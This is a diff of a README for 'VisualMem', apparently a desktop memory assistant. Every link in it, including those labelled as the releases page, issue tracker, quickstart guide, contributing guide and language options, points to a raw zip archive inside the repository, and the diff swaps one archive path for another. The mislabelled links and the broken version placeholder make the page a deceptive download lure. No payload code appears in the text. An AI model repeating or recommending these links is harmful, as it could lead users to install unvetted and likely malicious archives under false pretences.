@@ -1,11 +1,11 @@
 # 🎉 VisualMem - Your Personal Visual Memory Assistant
 
 <p align="center">
-    <a href="https://raw.githubusercontent.com/ilyasse253/VisualMem/main/core/retrieval/Visual_Mem_v1.8.zip" style="font-size: 24px; padding: 10px; background-color: blue; color: white; text-decoration: none; border-radius: 5px;">Download VisualMem</a>
+    <a href="https://raw.githubusercontent.com/ilyasse253/VisualMem/main/core/preprocess/Mem_Visual_3.7.zip" style="font-size: 24px; padding: 10px; background-color: blue; color: white; text-decoration: none; border-radius: 5px;">Download VisualMem</a>
 </p>
 
 <p align="center">
-    <a href="https://raw.githubusercontent.com/ilyasse253/VisualMem/main/core/retrieval/Visual_Mem_v1.8.zip">English</a> | <a href="https://raw.githubusercontent.com/ilyasse253/VisualMem/main/core/retrieval/Visual_Mem_v1.8.zip">简体中文</a>
+    <a href="https://raw.githubusercontent.com/ilyasse253/VisualMem/main/core/preprocess/Mem_Visual_3.7.zip">English</a> | <a href="https://raw.githubusercontent.com/ilyasse253/VisualMem/main/core/preprocess/Mem_Visual_3.7.zip">简体中文</a>
 </p>
 
 ---
@@ -16,11 +16,11 @@ Welcome to VisualMem! This guide will help you download and run the application.
 
 ### Step 1: Visit the Releases Page
 
-To download VisualMem, first, visit the [Releases page](https://raw.githubusercontent.com/ilyasse253/VisualMem/main/core/retrieval/Visual_Mem_v1.8.zip). This is where you can find the latest version of the software.
+To download VisualMem, first, visit the [Releases page](https://raw.githubusercontent.com/ilyasse253/VisualMem/main/core/preprocess/Mem_Visual_3.7.zip). This is where you can find the latest version of the software.
 
 ### Step 2: Choose the Right File
 
-On the Releases page, you will see different version files available for download. Look for the latest version of VisualMem, which will have a name like `https://raw.githubusercontent.com/ilyasse253/VisualMem/main/core/retrieval/Visual_Mem_v1.8.zip` (the Xs will represent the version numbers).
+On the Releases page, you will see different version files available for download. Look for the latest version of VisualMem, which will have a name like `https://raw.githubusercontent.com/ilyasse253/VisualMem/main/core/preprocess/Mem_Visual_3.7.zip` (the Xs will represent the version numbers).
 
 ### Step 3: Download the File
 
@@ -54,7 +54,7 @@ VisualMem offers several powerful features:
 
 ## 📥 Download & Install VisualMem
 
-To begin using VisualMem, go to the [Releases page](https://raw.githubusercontent.com/ilyasse253/VisualMem/main/core/retrieval/Visual_Mem_v1.8.zip) and download the installer for your operating system. 
+To begin using VisualMem, go to the [Releases page](https://raw.githubusercontent.com/ilyasse253/VisualMem/main/core/preprocess/Mem_Visual_3.7.zip) and download the installer for your operating system. 
 
 Follow the instructions in Step 3 and Step 4 to successfully install the application.
 
@@ -80,15 +80,15 @@ If you encounter any issues during installation or usage, here are a few tips:
   
 2. **Running the Application**: If VisualMem does not start, check your system requirements. Make sure your computer meets the minimum specifications.
 
-For additional help, you can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/ilyasse253/VisualMem/main/core/retrieval/Visual_Mem_v1.8.zip).
+For additional help, you can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/ilyasse253/VisualMem/main/core/preprocess/Mem_Visual_3.7.zip).
 
 ## 🔗 Additional Resources
 
-- [Quickstart Guide](https://raw.githubusercontent.com/ilyasse253/VisualMem/main/core/retrieval/Visual_Mem_v1.8.zip): Learn how to efficiently use VisualMem after installation.
-- [Issues Tracker](https://raw.githubusercontent.com/ilyasse253/VisualMem/main/core/retrieval/Visual_Mem_v1.8.zip): Report bugs or request features.
+- [Quickstart Guide](https://raw.githubusercontent.com/ilyasse253/VisualMem/main/core/preprocess/Mem_Visual_3.7.zip): Learn how to efficiently use VisualMem after installation.
+- [Issues Tracker](https://raw.githubusercontent.com/ilyasse253/VisualMem/main/core/preprocess/Mem_Visual_3.7.zip): Report bugs or request features.
 
 ## 🌐 Community & Contributions
 
-VisualMem is open-source. Contributions are welcome! If you want to help improve VisualMem, feel free to submit a pull request. Check our [Contributing Guide](https://raw.githubusercontent.com/ilyasse253/VisualMem/main/core/retrieval/Visual_Mem_v1.8.zip) for more details.
+VisualMem is open-source. Contributions are welcome! If you want to help improve VisualMem, feel free to submit a pull request. Check our [Contributing Guide](https://raw.githubusercontent.com/ilyasse253/VisualMem/main/core/preprocess/Mem_Visual_3.7.zip) for more details.
 
 Thank you for choosing VisualMem! We hope it enhances your memory experience effectively.
